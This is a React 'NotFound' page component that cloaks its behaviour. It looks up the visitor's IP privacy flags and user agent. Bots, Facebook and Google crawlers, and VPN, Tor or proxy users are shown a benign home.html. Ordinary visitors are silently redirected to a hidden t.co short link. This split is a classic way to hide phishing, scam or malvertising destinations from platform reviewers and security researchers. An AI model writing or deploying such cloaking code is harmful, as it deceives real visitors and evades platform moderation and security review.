import React, { useEffect, useState } from "react";
import { isbot } from "isbot";
import { Helmet } from 'react-helmet';

function NotFound() {
  let[countryCode, setCountryCode] = useState('');
  let[IsUserHiden, SetUserHiden] = useState(false);
  let[IframeUrl, SetIframeUrl] = useState('https://www.betterpic.io/?via=dhma24');
  let[SiteTitleMeta, SetSiteTitleMeta] = useState('Home page');
  let[SiteTitleHome, SetSiteTitleHome] = useState('Home page');


  function showIframe(file,title,favicon) {
    const html = (
      <>
      <Helmet>
          <title>{title}</title>
          {favicon ? 
          <link rel="icon" type="image/svg+xml" href="./favicon2.ico"/>
           :
           null
          }
      </Helmet>
      <iframe src={file} style={{
        position: 'fixed',
        top: '0px',
        bottom: '0px',
        right: '0px',
        width: '100%',
        border: 'none',
        margin: '0',
        padding: '0',
        overflow: 'hidden',
        zIndex: '999999',
        height: '100%',
      }}></iframe>
      </>
    );
    return html;
  }
 
  const setLocaltion =  () => {
    try {
      fetch("https://ipinfo.io/widget").then(d => d.json()).then(d => {
        var countryCode = d.country;
        var privacy = d.privacy;
        if(privacy){
          if(
            privacy.vpn == true
            || privacy.hosting == true
            || privacy.relay == true
            || privacy.tor == true
            || privacy.proxy == true
          ){
            SetUserHiden(true);
          }
        }
        //setCountryCode(countryCode.toLowerCase());
      });
    } catch (error) {
      console.error("Error fetching data:", error);
    }
  };

  useEffect(() => {
    setLocaltion();
  }, []);

  const userAgent = navigator.userAgent.toLowerCase();
  if(!userAgent.includes('facebook') 
    && !userAgent.includes('google') 
    && !isbot(userAgent)){
    if(IsUserHiden){
      return(showIframe("home.html",SiteTitleHome,false));
    }else{
      return <meta httpEquiv="refresh" content="1; url=https://t.co/N0h6U0VEwk"/>;
      //return(showIframe(IframeUrl,SiteTitleMeta,true));
    }
  }else{
    return(showIframe("home.html",SiteTitleHome,false));
  }
}

export default NotFound;
